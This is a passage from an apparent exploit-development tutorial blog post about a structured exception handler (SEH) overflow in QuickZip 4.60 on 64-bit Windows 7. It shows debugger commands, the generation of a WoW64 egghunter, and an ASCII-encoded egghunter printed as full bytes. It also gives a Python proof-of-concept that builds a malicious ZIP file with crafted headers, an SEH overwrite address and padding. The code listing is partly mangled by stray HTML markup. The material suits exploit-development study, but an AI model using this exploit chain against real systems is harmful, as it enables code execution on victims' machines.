<p>We get our crash and we control SEH, great! The problem is that we&rsquo;re limited to a very restricted set of characters to use with our payload and, because we had to use address with <code>NULL</code> byte to invoke <em>POP-POP-RET</em> instructions, signifcant portion of our payload got cut off and the remaining space for our shellcode is not very big at all.</p>

<p>But how big is it exactly? Remember that we still have the padding we used at the beginning of our payload to get to SEH:</p>

<p><a href="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/13.before%20landing%20in%20SEH.png"><img src="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/13.before%20landing%20in%20SEH.png" alt="image" /></a></p>

<p>So how much space do we have? Exactly <strong>292</strong> bytes. Unfortunately it is not enough for any useful shellcode that would also need to be encoded to only contain ASCII printable characters.</p>

<p>This sounds like something that could be potentially solved with an egghunter!</p>

<p><strong>Egghunter</strong> is simply a bunch of instructions that look for a specific, known sequence of bytes (an &ldquo;egg&rdquo;) in the memory space of the program and, once it&rsquo;s found, redirects exection to that area.</p>

<p>This way, we don&rsquo;t really need to worry where our shellcode ends up, we can just call egghunter routine and it&rsquo;ll find it for us!</p>

<p>Sounds great, but the next question is, does the &lsquo;cut off&rsquo; portion of the payload actually ends up anywhere in the memory? Let&rsquo;s find out.</p>

<p>Let&rsquo;s generate pattern of <strong>3764</strong> unique characters (to fill in our payload after the <code>NULL</code> byte) and replace existing A&rsquo;s with it.
<code>
!mona pc 3764
</code></p>

<p>Let&rsquo;s trigger the crash and, as we get our first exception, do not pass the exception to the program, but instead invoke the following command to search for the previously generated pattern in memory:
<code>
!mona findmsp
</code></p>

<p><a href="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/14.rest%20of%20payload%20in%20memory.png"><img src="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/14.rest%20of%20payload%20in%20memory.png" alt="image" /></a></p>

<p>Fantastic! The entire &lsquo;cut off&rsquo; portion of the payload is still in the memory, so we should be able to successfully use the egghunter to get to our shellcode.</p>

<h2>Egghunter</h2>

<p>So now we know that we should be able to use an egghunter to get to our shellcode, but we only have <strong>292</strong> bytes at our disposal. We can actually do quite a lot with 292 bytes, however, we need to remember that we can only use very limited character set.</p>

<p>Let&rsquo;s try to encode the egghunter with metasploit&rsquo;s <code>x86/alpha_mixed</code> encoder and see how much space we&rsquo;ll have left after this.</p>

<p>Firstly, let&rsquo;s generate egghunter payload. Remember that we&rsquo;re dealing with 64-bit OS, so we need to use appropriate egghunter routine as well (a lot more detailed information on it can be found on <a href="https://www.corelan.be/index.php/2011/11/18/wow64-egghunter/">https://www.corelan.be/index.php/2011/11/18/wow64-egghunter/</a>):</p>

<pre><code>!mona egghunter -wow64
</code></pre>

<p>Copy the generated bytes into a text file and convert it into a binary file using <code>xxd</code>:</p>

<pre><code># cat egghunter-wow64.txt 
31db53535353b3c06681caff0f42526a265833c98bd464ff135e5a3c0574e9b8773030748bfaaf75e4af75e1ffe7
# cat egghunter-wow64.txt | xxd -r -p &gt; egghunter-wow64.bin
</code></pre>

<p>Now, we need to use an encoder to ensure only ASCII printable characters are actually used.</p>

<pre><code># msfencode -e x86/alpha_mixed bufferregister=eax -i egghunter-wow64.bin
[*] x86/alpha_mixed succeeded with size 146 (iteration=1)

buf = 
"\x50\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49" +
"\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30" +
"\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42" +
"\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x66\x51\x49\x4b" +
"\x52\x73\x53\x63\x62\x73\x36\x33\x4e\x53\x6f\x30\x75\x36" +
"\x6d\x51\x59\x5a\x49\x6f\x36\x6f\x72\x62\x71\x42\x42\x4a" +
"\x66\x46\x56\x38\x74\x73\x78\x49\x4c\x4b\x4b\x64\x61\x74" +
"\x49\x6f\x47\x63\x31\x4e\x50\x5a\x77\x4c\x77\x75\x53\x44" +
"\x49\x79\x38\x38\x52\x57\x36\x50\x50\x30\x33\x44\x6c\x4b" +
"\x59\x6a\x4e\x4f\x32\x55\x38\x64\x4e\x4f\x70\x75\x6b\x51" +
"\x6b\x4f\x79\x77\x41\x41"
</code></pre>

<p><em>Note:</em> I have used <code>bufferedregister=eax</code> option. The reason being is that the encoder needs to find where it is in the memory to be able to carry on with decoding the payload. Originally, the routines responsible for doing this are not in the ASCII printable set and therefore would be breaking our payload.</p>

<p>Specifying <code>bufferregister</code> option basically tells the encoder not to worry about finding its own place in memory as we&rsquo;ll do it beforehand and we&rsquo;ll put its address in the EAX register. This way, our encoded egghunter is purely ASCII characters only (more information on generating alphanumeric shellcode can be found <a href="https://www.offensive-security.com/metasploit-unleashed/alphanumeric-shellcode/">here</a>).</p>

<p>Let&rsquo;s update our PoC exploit to reflect what we have done so far.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="err">!</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">python</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">header_1</span> <span class="o">=</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x50</span>\<span class="n">x4B</span>\<span class="n">x03</span>\<span class="n">x04</span>\<span class="n">x14</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">xB7</span>\<span class="n">xAC</span>\<span class="n">xCE</span>\<span class="n">x34</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">xe4</span>\<span class="n">x0f</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">header_2</span> <span class="o">=</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x50</span>\<span class="n">x4B</span>\<span class="n">x01</span>\<span class="n">x02</span>\<span class="n">x14</span>\<span class="n">x00</span>\<span class="n">x14</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">xB7</span>\<span class="n">xAC</span>\<span class="n">xCE</span>\<span class="n">x34</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">xe4</span>\<span class="n">x0f</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x01</span>\<span class="n">x00</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x24</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">header_3</span> <span class="o">=</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x50</span>\<span class="n">x4B</span>\<span class="n">x05</span>\<span class="n">x06</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x01</span>\<span class="n">x00</span>\<span class="n">x01</span>\<span class="n">x00</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x12</span>\<span class="n">x10</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x02</span>\<span class="n">x10</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">print</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;[</span><span class="o">+</span><span class="p">]</span> <span class="n">Building</span> <span class="n">PoC</span><span class="o">..&amp;</span><span class="n">rdquo</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">max_size</span> <span class="o">=</span> <span class="mi">4064</span>
</span><span class='line'><span class="n">nseh_offset</span> <span class="o">=</span> <span class="mi">292</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">msfencode</span> <span class="o">-</span><span class="n">e</span> <span class="n">x86</span><span class="o">/</span><span class="n">alpha_mixed</span> <span class="n">bufferregister</span><span class="o">=</span><span class="n">eax</span> <span class="o">-</span><span class="n">i</span> <span class="n">egghunter</span><span class="o">-</span><span class="n">wow64</span><span class="o">.</span><span class="n">bin</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">x86</span><span class="o">/</span><span class="n">alpha_mixed</span> <span class="n">succeeded</span> <span class="k">with</span> <span class="n">size</span> <span class="mi">146</span> <span class="p">(</span><span class="n">iteration</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">egghunter</span> <span class="o">=</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x50</span>\<span class="n">x59</span>\<span class="n">x49</span>\<span class="n">x49</span>\<span class="n">x49</span>\<span class="n">x49</span>\<span class="n">x49</span>\<span class="n">x49</span>\<span class="n">x49</span>\<span class="n">x49</span>\<span class="n">x49</span>\<span class="n">x49</span>\<span class="n">x49</span>\<span class="n">x49</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x49</span>\<span class="n">x49</span>\<span class="n">x49</span>\<span class="n">x49</span>\<span class="n">x37</span>\<span class="n">x51</span>\<span class="n">x5a</span>\<span class="n">x6a</span>\<span class="n">x41</span>\<span class="n">x58</span>\<span class="n">x50</span>\<span class="n">x30</span>\<span class="n">x41</span>\<span class="n">x30</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x41</span>\<span class="n">x6b</span>\<span class="n">x41</span>\<span class="n">x41</span>\<span class="n">x51</span>\<span class="n">x32</span>\<span class="n">x41</span>\<span class="n">x42</span>\<span class="n">x32</span>\<span class="n">x42</span>\<span class="n">x42</span>\<span class="n">x30</span>\<span class="n">x42</span>\<span class="n">x42</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x41</span>\<span class="n">x42</span>\<span class="n">x58</span>\<span class="n">x50</span>\<span class="n">x38</span>\<span class="n">x41</span>\<span class="n">x42</span>\<span class="n">x75</span>\<span class="n">x4a</span>\<span class="n">x49</span>\<span class="n">x66</span>\<span class="n">x51</span>\<span class="n">x49</span>\<span class="n">x4b</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x52</span>\<span class="n">x73</span>\<span class="n">x53</span>\<span class="n">x63</span>\<span class="n">x62</span>\<span class="n">x73</span>\<span class="n">x36</span>\<span class="n">x33</span>\<span class="n">x4e</span>\<span class="n">x53</span>\<span class="n">x6f</span>\<span class="n">x30</span>\<span class="n">x75</span>\<span class="n">x36</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x6d</span>\<span class="n">x51</span>\<span class="n">x59</span>\<span class="n">x5a</span>\<span class="n">x49</span>\<span class="n">x6f</span>\<span class="n">x36</span>\<span class="n">x6f</span>\<span class="n">x72</span>\<span class="n">x62</span>\<span class="n">x71</span>\<span class="n">x42</span>\<span class="n">x42</span>\<span class="n">x4a</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x66</span>\<span class="n">x46</span>\<span class="n">x56</span>\<span class="n">x38</span>\<span class="n">x74</span>\<span class="n">x73</span>\<span class="n">x78</span>\<span class="n">x49</span>\<span class="n">x4c</span>\<span class="n">x4b</span>\<span class="n">x4b</span>\<span class="n">x64</span>\<span class="n">x61</span>\<span class="n">x74</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x49</span>\<span class="n">x6f</span>\<span class="n">x47</span>\<span class="n">x63</span>\<span class="n">x31</span>\<span class="n">x4e</span>\<span class="n">x50</span>\<span class="n">x5a</span>\<span class="n">x77</span>\<span class="n">x4c</span>\<span class="n">x77</span>\<span class="n">x75</span>\<span class="n">x53</span>\<span class="n">x44</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x49</span>\<span class="n">x79</span>\<span class="n">x38</span>\<span class="n">x38</span>\<span class="n">x52</span>\<span class="n">x57</span>\<span class="n">x36</span>\<span class="n">x50</span>\<span class="n">x50</span>\<span class="n">x30</span>\<span class="n">x33</span>\<span class="n">x44</span>\<span class="n">x6c</span>\<span class="n">x4b</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x59</span>\<span class="n">x6a</span>\<span class="n">x4e</span>\<span class="n">x4f</span>\<span class="n">x32</span>\<span class="n">x55</span>\<span class="n">x38</span>\<span class="n">x64</span>\<span class="n">x4e</span>\<span class="n">x4f</span>\<span class="n">x70</span>\<span class="n">x75</span>\<span class="n">x6b</span>\<span class="n">x51</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x6b</span>\<span class="n">x4f</span>\<span class="n">x79</span>\<span class="n">x77</span>\<span class="n">x41</span>\<span class="n">x41</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">payload</span> <span class="o">=</span> <span class="n">egghunter</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">A</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">*</span> <span class="p">(</span><span class="n">nseh_offset</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>   <span class="c"># padding for nSEH</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">BBBB</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>                               <span class="c"># nSEH</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x33</span>\<span class="n">x28</span>\<span class="n">x42</span>\<span class="n">x00</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>                   <span class="c"># SEH</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0En1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep9Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="o">.</span><span class="n">txt</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">print</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;[</span><span class="o">+</span><span class="p">]</span> <span class="n">Length</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
